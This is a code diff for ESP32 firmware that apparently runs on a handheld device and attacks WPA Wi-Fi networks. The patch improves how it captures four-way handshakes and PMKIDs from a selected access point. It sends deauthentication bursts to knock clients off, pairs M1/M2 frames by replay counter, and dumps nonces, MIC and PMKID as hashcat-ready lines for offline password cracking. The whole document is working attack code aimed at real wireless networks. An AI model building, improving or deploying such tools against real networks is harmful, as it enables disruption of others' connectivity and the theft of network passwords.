@@ -38,7 +38,8 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c)
 // ---------------------------------------------------------------------------
 #define HS_EEPROM_BASE   200
 #define HS_MAGIC0        0x48
-#define HS_MAGIC1        0x53
+#define HS_MAGIC1        0x54   // bumped: struct layout changed (added sta_mac) -
+                                 // forces a clean re-init instead of misreading old bytes
 #define HS_MAX_ENTRIES   2
 #define HS_SSID_LEN      33
 #define HS_PMKID_LEN     16
@@ -50,13 +51,14 @@ struct __attribute__((packed)) HandshakeEntry {
     uint8_t bssid[6];
     char    ssid[HS_SSID_LEN];
     uint8_t eapol_count;
-    uint8_t flags;                  // bit0=M1, bit1=M2, bit2=has_pmkid
+    uint8_t flags;                  // bit0=M1, bit1=M2, bit2=has_pmkid, bit3=has_sta_mac
     uint8_t pmkid[HS_PMKID_LEN];    // only valid when flags bit2 set
+    uint8_t sta_mac[6];             // station MAC, only valid when flags bit3 set
     uint8_t snap_len;
     uint8_t snap[HS_SNAP_LEN];      // leading bytes of best EAPOL frame
 };
 
-static_assert(sizeof(HandshakeEntry) == 92, "HandshakeEntry size");
+static_assert(sizeof(HandshakeEntry) == 98, "HandshakeEntry size");
 
 #define HS_ENTRY_SIZE   (sizeof(HandshakeEntry))
 #define HS_COUNT_ADDR   (HS_EEPROM_BASE + 2)
@@ -65,6 +67,7 @@ static_assert(sizeof(HandshakeEntry) == 92, "HandshakeEntry size");
 #define FLAG_M1      0x01
 #define FLAG_M2      0x02
 #define FLAG_PMKID   0x04
+#define FLAG_STAMAC  0x08
 
 // ---------------------------------------------------------------------------
 // Runtime
@@ -113,16 +116,34 @@ static bool hasPmkid = false;
 static uint8_t capturedPmkid[HS_PMKID_LEN];
 static uint8_t bestSnap[HS_SNAP_LEN];
 static uint8_t bestSnapLen = 0;
+static bool snapFromPmkid = false;  // whether bestSnap came from a PMKID-bearing frame
 static bool deauthStopped = false;
 
-// Lock-free ring buffer hand-off from callback (4 slots for M1-M4 bursts)
+// Replay-counter pairing: M1 and M2 only belong together if their 8-byte
+// replay counters match, otherwise a crossed pair is silently uncrackable.
+static uint8_t m1ReplayCounter[8];
+static uint8_t capturedStaMac[6];
+static bool haveStaMac = false;
+
+// Full frames kept in RAM for serial dump (ESP flash is too small)
 #define CANDIDATE_MAX   256
 #define CANDIDATE_SLOTS 4
+#define FRAME_MAX       256
 static uint8_t           candidateBuf[CANDIDATE_SLOTS][CANDIDATE_MAX];
 static volatile uint16_t candidateLen[CANDIDATE_SLOTS];
 static volatile bool     candidateReady[CANDIDATE_SLOTS];
-static volatile uint8_t  candWrite = 0;  // next slot callback writes
-static volatile uint8_t  candRead  = 0;  // next slot main loop reads
+static volatile uint8_t  candWrite = 0;
+static volatile uint8_t  candRead  = 0;
+// Cross-core safe hand-off between WiFi task (callback) and Arduino loop
+static portMUX_TYPE candMux = portMUX_INITIALIZER_UNLOCKED;
+static volatile uint16_t eapolDropped = 0;  // frames seen but not queued
+
+static uint8_t frameM1[FRAME_MAX];
+static uint16_t frameM1Len = 0;
+static uint8_t frameM2[FRAME_MAX];
+static uint16_t frameM2Len = 0;
+static uint8_t framePmkidSrc[FRAME_MAX];  // full frame that carried PMKID (usually M1)
+static uint16_t framePmkidSrcLen = 0;
 
 static uint8_t targetBssid[6];
 static uint8_t targetChannel = 1;
@@ -140,6 +161,7 @@ static bool lastGotM2 = false;
 static uint16_t lastScanCount = 0;
 static unsigned long lastScanUpdate = 0;
 static unsigned long savedMsgUntil = 0;
+static unsigned long lastUiTick = 0;  // force periodic redraw for elapsed time
 
 static uint8_t deauthFrame[26] = {
     0xC0, 0x00, 0x00, 0x00,
@@ -211,6 +233,10 @@ static void hsSaveCurrentCapture() {
         e.flags |= FLAG_PMKID;
         memcpy(e.pmkid, capturedPmkid, HS_PMKID_LEN);
     }
+    if (haveStaMac) {
+        e.flags |= FLAG_STAMAC;
+        memcpy(e.sta_mac, capturedStaMac, 6);
+    }
     e.snap_len = bestSnapLen;
     if (bestSnapLen) memcpy(e.snap, bestSnap, bestSnapLen);
 
@@ -233,12 +259,141 @@ static void hsSaveCurrentCapture() {
 }
 
 // ---------------------------------------------------------------------------
-// Serial export (usable offline)
+// Serial helpers – dump everything useful for offline cracking
 // ---------------------------------------------------------------------------
+static void serialPrintHex(const uint8_t *data, uint16_t len) {
+    for (uint16_t i = 0; i < len; i++) Serial.printf("%02x", data[i]);
+}
+
+static void serialPrintHexSpaced(const uint8_t *data, uint16_t len) {
+    for (uint16_t i = 0; i < len; i++) {
+        Serial.printf("%02x", data[i]);
+        if (((i + 1) % 16) == 0 && (i + 1) < len) Serial.println();
+        else if ((i + 1) < len) Serial.print(' ');
+    }
+    Serial.println();
+}
+
+// Dump current in-RAM capture (full frames) – used on Save / Auto-stop
+static void serialDumpLiveCapture() {
+    Serial.println();
+    Serial.println(F("========== CAPTURE DUMP (copy this) =========="));
+    Serial.println(F("# Frames trimmed to EAPOL Length (ESP32 sig_len junk removed)"));
+    Serial.printf("SSID: %s\n", targetSsid);
+    Serial.print(F("SSID_HEX: "));
+    for (size_t i = 0; targetSsid[i]; i++) Serial.printf("%02x", (uint8_t)targetSsid[i]);
+    Serial.println();
+    Serial.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                  targetBssid[0], targetBssid[1], targetBssid[2],
+                  targetBssid[3], targetBssid[4], targetBssid[5]);
+    Serial.print(F("BSSID_HEX: "));
+    serialPrintHex(targetBssid, 6);
+    Serial.println();
+    Serial.printf("CHANNEL: %u\n", targetChannel);
+    Serial.printf("EAPOL_COUNT: %u  (dropped: %u)\n", (unsigned)eapolCount, (unsigned)eapolDropped);
+    Serial.printf("M1: %s  M2: %s  PMKID: %s\n",
+                  gotM1 ? "YES" : "NO",
+                  gotM2 ? "YES" : "NO",
+                  hasPmkid ? "YES" : "NO");
+
+    if (hasPmkid) {
+        Serial.print(F("PMKID: "));
+        serialPrintHex(capturedPmkid, HS_PMKID_LEN);
+        Serial.println();
+        // hashcat mode 16800/22000-style line: pmkid*bssid*station*essid
+        Serial.print(F("PMKID_HASHCAT_HINT: "));
+        serialPrintHex(capturedPmkid, HS_PMKID_LEN);
+        Serial.print('*');
+        serialPrintHex(targetBssid, 6);
+        Serial.print('*');
+        if (haveStaMac) {
+            serialPrintHex(capturedStaMac, 6);
+            Serial.println('*');
+        } else {
+            Serial.println(F("????????????????*"));
+            Serial.println(F("# Station MAC not seen yet; replace ? with it if known"));
+        }
+        Serial.print(F("ESSID_HEX: "));
+        for (size_t i = 0; targetSsid[i]; i++) Serial.printf("%02x", (uint8_t)targetSsid[i]);
+        Serial.println();
+    } else {
+        Serial.println(F("PMKID: not present"));
+    }
+
+    if (frameM1Len > 0) {
+        Serial.printf("M1_FRAME_LEN: %u\n", frameM1Len);
+        Serial.println(F("M1_FRAME_HEX:"));
+        serialPrintHexSpaced(frameM1, frameM1Len);
+        // Extract ANonce if possible (nonce starts at ethertype+19)
+        int off = -1;
+        for (int i = 24; i + 8 < (int)frameM1Len; i++) {
+            if (frameM1[i] == 0x88 && frameM1[i + 1] == 0x8E) { off = i; break; }
+            if (i + 7 < (int)frameM1Len &&
+                frameM1[i] == 0xAA && frameM1[i+1] == 0xAA && frameM1[i+2] == 0x03 &&
+                frameM1[i+3] == 0x00 && frameM1[i+4] == 0x00 && frameM1[i+5] == 0x00 &&
+                frameM1[i+6] == 0x88 && frameM1[i+7] == 0x8E) { off = i + 6; break; }
+        }
+        if (off >= 0 && off + 51 < (int)frameM1Len) {
+            Serial.print(F("ANONCE: "));
+            serialPrintHex(frameM1 + off + 19, 32);
+            Serial.println();
+        }
+    } else {
+        Serial.println(F("M1_FRAME: not captured"));
+    }
+
+    if (frameM2Len > 0) {
+        Serial.printf("M2_FRAME_LEN: %u\n", frameM2Len);
+        Serial.println(F("M2_FRAME_HEX:"));
+        serialPrintHexSpaced(frameM2, frameM2Len);
+        int off = -1;
+        for (int i = 24; i + 8 < (int)frameM2Len; i++) {
+            if (frameM2[i] == 0x88 && frameM2[i + 1] == 0x8E) { off = i; break; }
+            if (i + 7 < (int)frameM2Len &&
+                frameM2[i] == 0xAA && frameM2[i+1] == 0xAA && frameM2[i+2] == 0x03 &&
+                frameM2[i+3] == 0x00 && frameM2[i+4] == 0x00 && frameM2[i+5] == 0x00 &&
+                frameM2[i+6] == 0x88 && frameM2[i+7] == 0x8E) { off = i + 6; break; }
+        }
+        if (off >= 0 && off + 51 < (int)frameM2Len) {
+            Serial.print(F("SNONCE: "));
+            serialPrintHex(frameM2 + off + 19, 32);
+            Serial.println();
+        }
+        if (off >= 0 && off + 99 < (int)frameM2Len) {
+            Serial.print(F("MIC: "));
+            serialPrintHex(frameM2 + off + 83, 16);
+            Serial.println();
+        }
+    } else {
+        Serial.println(F("M2_FRAME: not captured"));
+    }
+
+    if (framePmkidSrcLen > 0 && hasPmkid) {
+        Serial.printf("PMKID_SRC_FRAME_LEN: %u\n", framePmkidSrcLen);
+        Serial.println(F("PMKID_SRC_FRAME_HEX:"));
+        serialPrintHexSpaced(framePmkidSrc, framePmkidSrcLen);
+    }
+
+    if (bestSnapLen > 0) {
+        Serial.printf("SNAP_LEN: %u  SNAP_HEX: ", bestSnapLen);
+        serialPrintHex(bestSnap, bestSnapLen);
+        Serial.println();
+    }
+
+    Serial.println(F("========== END DUMP =========="));
+    Serial.println(F("# Paste M1+M2 frames into a tool that builds hccapx/22000,"));
+    Serial.println(F("# or use PMKID with hcxpcapngtool / hashcat -m 16800."));
+    Serial.println();
+}
+
+// Dump a stored EEPROM entry (metadata + snap only – full frames not in EEPROM)
 static void serialDumpEntry(const HandshakeEntry &e, int idx) {
     Serial.println();
     Serial.printf("--- Handshake slot %d ---\n", idx);
     Serial.printf("SSID: %s\n", e.ssid);
+    Serial.print(F("SSID_HEX: "));
+    for (size_t i = 0; e.ssid[i]; i++) Serial.printf("%02x", (uint8_t)e.ssid[i]);
+    Serial.println();
     Serial.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                   e.bssid[0], e.bssid[1], e.bssid[2],
                   e.bssid[3], e.bssid[4], e.bssid[5]);
@@ -248,24 +403,31 @@ static void serialDumpEntry(const HandshakeEntry &e, int idx) {
                   (e.flags & FLAG_M2) ? "yes" : "no",
                   (e.flags & FLAG_PMKID) ? "yes" : "no");
     if (e.flags & FLAG_PMKID) {
-        Serial.print("PMKID: ");
-        for (int i = 0; i < HS_PMKID_LEN; i++) Serial.printf("%02x", e.pmkid[i]);
+        Serial.print(F("PMKID: "));
+        serialPrintHex(e.pmkid, HS_PMKID_LEN);
         Serial.println();
-        // hashcat 16800-style hint (BSSID + PMKID) – user still needs full context
-        Serial.print("PMKID hex: ");
-        for (int i = 0; i < HS_PMKID_LEN; i++) Serial.printf("%02x", e.pmkid[i]);
-        Serial.print(":");
-        for (int i = 0; i < 6; i++) Serial.printf("%02x", e.bssid[i]);
-        Serial.println();
+        Serial.print(F("PMKID_HASHCAT_HINT: "));
+        serialPrintHex(e.pmkid, HS_PMKID_LEN);
+        Serial.print('*');
+        serialPrintHex(e.bssid, 6);
+        Serial.print('*');
+        if (e.flags & FLAG_STAMAC) {
+            serialPrintHex(e.sta_mac, 6);
+            Serial.println('*');
+        } else {
+            Serial.println(F("????????????????*"));
+        }
     } else {
-        Serial.println("PMKID: not present (AP did not send KDE or not captured)");
+        Serial.println(F("PMKID: not present (AP did not send KDE or not captured)"));
     }
     if (e.snap_len) {
         Serial.printf("EAPOL snapshot (%u bytes): ", e.snap_len);
-        for (int i = 0; i < e.snap_len; i++) Serial.printf("%02x", e.snap[i]);
+        serialPrintHex(e.snap, e.snap_len);
         Serial.println();
     }
-    Serial.println("---");
+    Serial.println(F("---"));
+    Serial.println(F("# Note: full M1/M2 frames are only available in the live"));
+    Serial.println(F("# capture dump printed when you Save&Stop / auto-stop."));
 }
 
 // ---------------------------------------------------------------------------
@@ -278,25 +440,25 @@ static void IRAM_ATTR snifferCallback(void *buf, wifi_promiscuous_pkt_type_t typ
     const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
     const uint8_t *payload = pkt->payload;
     uint16_t len = pkt->rx_ctrl.sig_len;
+    // Need at least MAC header + minimal EAPOL; upper bound avoids garbage
     if (len < 36 || len > 800) return;
 
-    // BSSID in addr1/addr2/addr3
-    if (len >= 24) {
-        bool match = false;
-        if (memcmp(payload + 4,  targetBssid, 6) == 0) match = true;
-        else if (memcmp(payload + 10, targetBssid, 6) == 0) match = true;
-        else if (memcmp(payload + 16, targetBssid, 6) == 0) match = true;
-        if (!match) return;
-    } else return;
+    // BSSID match in addr1 / addr2 / addr3 (len already >= 36)
+    bool match = false;
+    if (memcmp(payload + 4,  targetBssid, 6) == 0) match = true;
+    else if (memcmp(payload + 10, targetBssid, 6) == 0) match = true;
+    else if (memcmp(payload + 16, targetBssid, 6) == 0) match = true;
+    if (!match) return;
 
-    // Quick ethertype search (limited)
-    int end = (len < 100) ? (int)len - 1 : 100;
+    // Quick ethertype search (limited window)
+    int end = (len < 120) ? (int)len - 1 : 120;
     for (int i = 24; i < end; i++) {
         if (payload[i] == 0x88 && payload[i + 1] == 0x8E) {
-            eapolCount++;
-            // Enqueue into next free ring slot (drop if full)
+            // Only count + queue if a free slot exists (accurate UI feedback)
+            portENTER_CRITICAL(&candMux);
             uint8_t w = candWrite;
             uint8_t next = (uint8_t)((w + 1) % CANDIDATE_SLOTS);
+            bool queued = false;
             if (next != candRead && !candidateReady[w]) {
                 uint16_t cl = len;
                 if (cl > CANDIDATE_MAX) cl = CANDIDATE_MAX;
@@ -304,7 +466,11 @@ static void IRAM_ATTR snifferCallback(void *buf, wifi_promiscuous_pkt_type_t typ
                 candidateLen[w] = cl;
                 candidateReady[w] = true;
                 candWrite = next;
+                eapolCount++;
+                queued = true;
             }
+            portEXIT_CRITICAL(&candMux);
+            if (!queued) eapolDropped++;
             break;
         }
     }
@@ -314,10 +480,9 @@ static void IRAM_ATTR snifferCallback(void *buf, wifi_promiscuous_pkt_type_t typ
 // Robust main-loop parser
 // ---------------------------------------------------------------------------
 static int findEapolOffset(const uint8_t *p, uint16_t len) {
-    // Search after MAC header; allow QoS and LLC/SNAP
     for (int i = 24; i + 8 < (int)len; i++) {
         if (p[i] == 0x88 && p[i + 1] == 0x8E) return i;
-        // LLC/SNAP: AA AA 03 00 00 00 88 8E (OUI must be 00 00 00)
+        // LLC/SNAP: AA AA 03 00 00 00 88 8E
         if (i + 7 < (int)len &&
             p[i] == 0xAA && p[i+1] == 0xAA && p[i+2] == 0x03 &&
             p[i+3] == 0x00 && p[i+4] == 0x00 && p[i+5] == 0x00 &&
@@ -326,69 +491,160 @@ static int findEapolOffset(const uint8_t *p, uint16_t len) {
     return -1;
 }
 
+// ESP32 promiscuous rx_ctrl.sig_len often over-reports by a few trailing junk
+// bytes (commonly ending in 00 00 00 78). Using those in a hash line breaks MIC
+// validation. Trim to the length the EAPOL header itself declares:
+//   ethertype(2) + ver(1)+type(1)+len(2) + bodylen  =>  off + 6 + bodylen
+static uint16_t trimmedFrameLen(const uint8_t *p, uint16_t len, int off) {
+    if (off < 0 || off + 5 >= (int)len) return len;
+    uint16_t bodylen = ((uint16_t)p[off + 4] << 8) | (uint16_t)p[off + 5];
+    // Body length must be at least the fixed EAPOL-Key fields (~95 bytes for M1)
+    // but don't enforce a hard minimum here — just refuse absurd values.
+    if (bodylen > 512) return len;
+    uint32_t need = (uint32_t)off + 6u + (uint32_t)bodylen;
+    if (need < 36 || need > len) return len;  // fall back if header looks wrong
+    return (uint16_t)need;
+}
+
 static void processOneCandidate(const uint8_t *p, uint16_t len) {
     int off = findEapolOffset(p, len);
     if (off < 0) return;
 
-    // EAPOL: ver(1) type(1) len(2) – type 3 = Key
+    // EAPOL: ethertype(2) ver(1) type(1) – type 3 = Key
     if (off + 4 >= (int)len) return;
     if (p[off + 3] != 0x03) return;   // not Key
 
-    // Key Information is big-endian at off+7 (high) / off+8 (low)
-    // Layout: ethertype[2] ver[1] type[1] bodylen[2] desc[1] keyinfo[2] ...
+    // Key Information big-endian at off+7 / off+8
+    // Layout from ethertype: 88 8E | ver | type | bodylen | desc | keyinfo ...
     if (off + 8 >= (int)len) return;
     uint16_t keyInfo = ((uint16_t)p[off + 7] << 8) | (uint16_t)p[off + 8];
 
-    bool keyAck  = (keyInfo & 0x0080) != 0;
-    bool keyMic  = (keyInfo & 0x0100) != 0;
+    // IEEE 802.11 Key Information bits (pairwise 4-way only):
+    //   bit3 Pairwise, bit7 Key Ack, bit8 Key MIC, bit9 Secure
+    bool keyAck   = (keyInfo & 0x0080) != 0;
+    bool keyMic   = (keyInfo & 0x0100) != 0;
+    bool secure   = (keyInfo & 0x0200) != 0;
+    bool pairwise = (keyInfo & 0x0008) != 0;
 
-    if (keyAck && !keyMic) gotM1 = true;
-    if (keyMic && !keyAck) gotM2 = true;
+    // Exclude M3 (secure), M4 (secure), and group-key rekeys (!pairwise)
+    bool isM1 = pairwise &&  keyAck && !keyMic && !secure;
+    bool isM2 = pairwise && !keyAck &&  keyMic && !secure;
 
-    // Keep a snapshot of the first useful EAPOL
-    if (bestSnapLen == 0) {
-        uint8_t sl = (len > HS_SNAP_LEN) ? HS_SNAP_LEN : (uint8_t)len;
-        memcpy(bestSnap, p, sl);
-        bestSnapLen = sl;
+    // Replay counter occupies off+11..off+18 - make sure the frame actually
+    // has those bytes before touching them (a real Key frame always does,
+    // since it needs at least the fixed header up to kdlen at off+99/+100,
+    // but don't assume that from length alone).
+    if (off + 18 >= (int)len) return;
+
+    // Replay counter (8 bytes) sits right after Key Length, at off+11..+18.
+    // M1 and M2 only form a crackable pair when they share this counter -
+    // otherwise you can end up with an ANonce from one handshake attempt
+    // and an SNonce/MIC from a different one, which will never validate.
+    // Trim ESP32 sig_len over-report using the EAPOL Length field
+    uint16_t tlen = trimmedFrameLen(p, len, off);
+
+    if (isM1) {
+        // Don't disturb an already fully-matched pair with a stray retry.
+        if (!(gotM1 && gotM2)) {
+            if (frameM1Len == 0 || tlen > frameM1Len) {
+                uint16_t cl = (tlen > FRAME_MAX) ? FRAME_MAX : tlen;
+                memcpy(frameM1, p, cl);
+                frameM1Len = cl;
+                memcpy(m1ReplayCounter, p + off + 11, 8);
+                gotM1 = true;
+                // A newly-accepted M1 starts a fresh attempt: any M2 we were
+                // holding belonged to the old (now superseded) M1, so drop it
+                // rather than let it silently pair with the wrong ANonce.
+                gotM2 = false;
+                frameM2Len = 0;
+            }
+        }
+    }
+    if (isM2 && frameM1Len > 0 &&
+        memcmp(p + off + 11, m1ReplayCounter, 8) == 0) {
+        if (frameM2Len == 0 || tlen > frameM2Len) {
+            uint16_t cl = (tlen > FRAME_MAX) ? FRAME_MAX : tlen;
+            memcpy(frameM2, p, cl);
+            frameM2Len = cl;
+            gotM2 = true;
+            if (!haveStaMac) {
+                memcpy(capturedStaMac, p + 10, 6);  // addr2 = TA = station
+                haveStaMac = true;
+            }
+        }
     }
 
-    // PMKID KDE lives in Key Data, which starts at off+99 after the fixed
-    // EAPOL-Key header fields (through MIC and key-data-length).
-    if (!hasPmkid && off + 99 < (int)len) {
-        uint16_t kdLen = ((uint16_t)p[off + 97] << 8) | (uint16_t)p[off + 98];
-        if (kdLen > 0 && (int)off + 99 + (int)kdLen <= (int)len) {
-            int kdStart = off + 99;
+    // PMKID KDE in Key Data (must run before snap preference so we know hasPmkid)
+    // Fixed header after ethertype:
+    //   ver(1)+type(1)+len(2)+desc(1)+keyinfo(2)+keylen(2)+replay(8)+nonce(32)
+    //   +IV(16)+RSC(8)+keyid(8)+MIC(16)+kdlen(2)  => key data starts at off+101
+    //   kdlen itself is at off+99 (high) / off+100 (low)
+    bool thisHasPmkid = false;
+    if (off + 101 < (int)len) {
+        uint16_t kdLen = ((uint16_t)p[off + 99] << 8) | (uint16_t)p[off + 100];
+        if (kdLen > 0 && (int)off + 101 + (int)kdLen <= (int)len) {
+            int kdStart = off + 101;
             int kdEnd   = kdStart + (int)kdLen;
             for (int j = kdStart; j + 22 <= kdEnd; j++) {
+                // Vendor KDE: type 0xDD, len >= 0x14, OUI 00-0F-AC, data type 4 (PMKID)
                 if (p[j] == 0xDD && p[j+1] >= 0x14 &&
                     p[j+2] == 0x00 && p[j+3] == 0x0F &&
                     p[j+4] == 0xAC && p[j+5] == 0x04) {
                     bool nz = false;
+                    uint8_t tmpPmkid[HS_PMKID_LEN];
                     for (int z = 0; z < HS_PMKID_LEN; z++) {
-                        capturedPmkid[z] = p[j + 6 + z];
-                        if (capturedPmkid[z]) nz = true;
+                        tmpPmkid[z] = p[j + 6 + z];
+                        if (tmpPmkid[z]) nz = true;
                     }
-                    if (nz) hasPmkid = true;
+                    if (nz) {
+                        thisHasPmkid = true;
+                        if (!hasPmkid) {
+                            memcpy(capturedPmkid, tmpPmkid, HS_PMKID_LEN);
+                            hasPmkid = true;
+                            uint16_t cl = (tlen > FRAME_MAX) ? FRAME_MAX : tlen;
+                            memcpy(framePmkidSrc, p, cl);
+                            framePmkidSrcLen = cl;
+                            // This frame is AP->STA, so addr1 (RA) is the station.
+                            if (!haveStaMac) {
+                                memcpy(capturedStaMac, p + 4, 6);
+                                haveStaMac = true;
+                            }
+                        }
+                    }
                     break;
                 }
             }
         }
     }
+
+    // EEPROM snap: prefer a PMKID-bearing frame over a earlier non-PMKID one
+    if (bestSnapLen == 0 || (thisHasPmkid && !snapFromPmkid)) {
+        uint8_t sl = (tlen > HS_SNAP_LEN) ? HS_SNAP_LEN : (uint8_t)tlen;
+        memcpy(bestSnap, p, sl);
+        bestSnapLen = sl;
+        snapFromPmkid = thisHasPmkid;
+    }
 }
 
 static void processCandidates() {
-    // Drain all pending ring slots (copy out first to avoid callback race)
     for (;;) {
-        uint8_t r = candRead;
-        if (!candidateReady[r]) break;
-
         uint8_t localBuf[CANDIDATE_MAX];
-        uint16_t len = candidateLen[r];
-        if (len > CANDIDATE_MAX) len = CANDIDATE_MAX;
-        memcpy(localBuf, candidateBuf[r], len);
-        candidateReady[r] = false;
-        candRead = (uint8_t)((candRead + 1) % CANDIDATE_SLOTS);
+        uint16_t len = 0;
+        bool have = false;
 
+        portENTER_CRITICAL(&candMux);
+        uint8_t r = candRead;
+        if (candidateReady[r]) {
+            len = candidateLen[r];
+            if (len > CANDIDATE_MAX) len = CANDIDATE_MAX;
+            memcpy(localBuf, candidateBuf[r], len);
+            candidateReady[r] = false;
+            candRead = (uint8_t)((candRead + 1) % CANDIDATE_SLOTS);
+            have = true;
+        }
+        portEXIT_CRITICAL(&candMux);
+
+        if (!have) break;
         processOneCandidate(localBuf, len);
     }
 }
@@ -396,16 +652,20 @@ static void processCandidates() {
 // ---------------------------------------------------------------------------
 // Radio
 // ---------------------------------------------------------------------------
-// clientMac: if non-NULL and not broadcast, used as addr1 (targeted deauth).
-//            if NULL, falls back to broadcast FF:FF:FF:FF:FF:FF.
 static void sendDeauthBurst(const uint8_t *clientMac) {
     esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
     static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+    static uint16_t deauthSeq = 0;
     const uint8_t *dst = (clientMac != NULL) ? clientMac : bcast;
-    memcpy(deauthFrame + 4,  dst, 6);          // addr1 = destination (client or broadcast)
-    memcpy(deauthFrame + 10, targetBssid, 6);  // addr2 = AP
-    memcpy(deauthFrame + 16, targetBssid, 6);  // addr3 = BSSID
+    memcpy(deauthFrame + 4,  dst, 6);
+    memcpy(deauthFrame + 10, targetBssid, 6);
+    memcpy(deauthFrame + 16, targetBssid, 6);
     for (int i = 0; i < 3; i++) {
+        // 802.11 seq control: fragment 0 in low 4 bits, seq in upper 12 (little-endian)
+        deauthSeq = (uint16_t)((deauthSeq + 1) & 0x0FFF);
+        uint16_t sc = (uint16_t)(deauthSeq << 4);
+        deauthFrame[22] = (uint8_t)(sc & 0xFF);
+        deauthFrame[23] = (uint8_t)((sc >> 8) & 0xFF);
         esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
         delay(1);
     }
@@ -471,7 +731,7 @@ static void processScanResults() {
 }
 
 // ---------------------------------------------------------------------------
-// Drawing
+// Draw
 // ---------------------------------------------------------------------------
 static void drawMenu() {
     u8g2.clearBuffer();
@@ -493,7 +753,8 @@ static void drawScanning() {
     snprintf(buf, sizeof(buf), "Found: %u", (unsigned)currentScanCount);
     u8g2.drawStr(0, 28, buf);
     u8g2.drawFrame(0, 40, 128, 10);
-    int fill = (int)(((millis() - scanStartTime) * 124) / SCAN_DURATION);
+    unsigned long elapsed = millis() - scanStartTime;
+    int fill = (int)((elapsed * 124) / SCAN_DURATION);
     if (fill > 124) fill = 124;
     if (fill > 0) u8g2.drawBox(2, 42, fill, 6);
     u8g2.setFont(u8g2_font_5x8_tr);
@@ -507,19 +768,20 @@ static void drawList() {
     u8g2.setFont(u8g2_font_6x10_tr);
     u8g2.drawStr(0, 10, "Select AP:");
     if (apCount == 0) {
-        u8g2.drawStr(0, 28, "No networks found");
+        u8g2.drawStr(0, 28, "No APs found");
         u8g2.setFont(u8g2_font_5x8_tr);
         u8g2.drawStr(0, 62, "L=Back");
     } else {
+        if (apIndex >= apCount) apIndex = apCount - 1;
         int start = apIndex > 0 ? apIndex - 1 : 0;
         if (apIndex == apCount - 1 && apCount > 2) start = apCount - 3;
         if (start < 0) start = 0;
         for (int i = 0; i < 3; i++) {
             int idx = start + i;
             if (idx >= apCount) break;
-            char line[22], shortS[16];
-            strncpy(shortS, apList[idx].ssid, 15);
-            shortS[15] = '\0';
+            char line[22], shortS[14];
+            strncpy(shortS, apList[idx].ssid, 13);
+            shortS[13] = '\0';
             snprintf(line, sizeof(line), "%s%s", idx == apIndex ? ">" : " ", shortS);
             u8g2.drawStr(0, 24 + i * 12, line);
         }
@@ -533,28 +795,45 @@ static void drawList() {
 static void drawCapture() {
     u8g2.clearBuffer();
     u8g2.setFont(u8g2_font_6x10_tr);
+
     char shortS[18];
     strncpy(shortS, targetSsid, 17);
     shortS[17] = '\0';
     u8g2.drawStr(0, 10, shortS);
 
     char buf[32];
-    snprintf(buf, sizeof(buf), "Ch:%d EAPOL:%u", targetChannel, (unsigned)eapolCount);
+    unsigned long elapsedSec = (millis() - captureStartTime) / 1000;
+    if (eapolDropped > 0) {
+        snprintf(buf, sizeof(buf), "Ch:%d E:%u D:%u %lus",
+                 targetChannel, (unsigned)eapolCount, (unsigned)eapolDropped, elapsedSec);
+    } else {
+        snprintf(buf, sizeof(buf), "Ch:%d EAPOL:%u %lus",
+                 targetChannel, (unsigned)eapolCount, elapsedSec);
+    }
     u8g2.drawStr(0, 22, buf);
 
-    snprintf(buf, sizeof(buf), "M1:%s M2:%s", gotM1 ? "Y" : "-", gotM2 ? "Y" : "-");
-    u8g2.drawStr(0, 34, buf);
+    // Clear phase status
+    const char *phase;
+    if (hasPmkid && gotM1 && gotM2) phase = "COMPLETE+PMKID";
+    else if (hasPmkid)              phase = "PMKID captured";
+    else if (gotM1 && gotM2)        phase = "HS COMPLETE";
+    else if (gotM1 && !gotM2)       phase = "Got M1, wait M2";
+    else if (!gotM1 && gotM2)       phase = "Got M2, wait M1";
+    else if (eapolCount > 0)        phase = "EAPOL seen...";
+    else                            phase = deauthStopped ? "Deauth: slow" : "Deauth: active";
 
-    if (hasPmkid) {
-        u8g2.drawStr(0, 46, "PMKID: YES");
-    } else if (gotM1 || gotM2) {
-        u8g2.drawStr(0, 46, "PMKID: none (EAPOL ok)");
-    } else {
-        u8g2.drawStr(0, 46, deauthStopped ? "Deauth: slow" : "Deauth: active");
-    }
+    u8g2.drawStr(0, 34, phase);
+
+    snprintf(buf, sizeof(buf), "M1:%s M2:%s PMKID:%s",
+             gotM1 ? "Y" : "-", gotM2 ? "Y" : "-", hasPmkid ? "Y" : "-");
+    u8g2.drawStr(0, 46, buf);
 
     u8g2.setFont(u8g2_font_5x8_tr);
-    u8g2.drawStr(0, 62, "L=Save&Stop");
+    if (gotM1 && gotM2) {
+        u8g2.drawStr(0, 62, "L=Save (Serial dump)");
+    } else {
+        u8g2.drawStr(0, 62, "L=Save&Stop");
+    }
     u8g2.sendBuffer();
     displayMirrorSend(u8g2);
 }
@@ -563,11 +842,18 @@ static void drawSavedMsg() {
     u8g2.clearBuffer();
     u8g2.setFont(u8g2_font_6x10_tr);
     u8g2.drawStr(24, 24, "Saved!");
-    if (hasPmkid) u8g2.drawStr(8, 42, "PMKID included");
-    else if (gotM1 || gotM2) u8g2.drawStr(4, 42, "EAPOL only (no PMKID)");
-    else u8g2.drawStr(16, 42, "Weak capture");
+    if (hasPmkid && (gotM1 || gotM2))
+        u8g2.drawStr(4, 42, "PMKID + EAPOL");
+    else if (hasPmkid)
+        u8g2.drawStr(8, 42, "PMKID included");
+    else if (gotM1 && gotM2)
+        u8g2.drawStr(8, 42, "Full HS (no PMKID)");
+    else if (gotM1 || gotM2)
+        u8g2.drawStr(4, 42, "Partial EAPOL");
+    else
+        u8g2.drawStr(16, 42, "Weak capture");
     u8g2.setFont(u8g2_font_5x8_tr);
-    u8g2.drawStr(0, 58, "Serial has full dump");
+    u8g2.drawStr(0, 58, "See Serial for frames");
     u8g2.sendBuffer();
     displayMirrorSend(u8g2);
 }
@@ -675,14 +961,20 @@ void handshakeCaptureSetup() {
     gotM1 = false;
     gotM2 = false;
     bestSnapLen = 0;
+    snapFromPmkid = false;
+    frameM1Len = 0;
+    frameM2Len = 0;
+    framePmkidSrcLen = 0;
+    eapolDropped = 0;
+    haveStaMac = false;
+    memset(m1ReplayCounter, 0, sizeof(m1ReplayCounter));
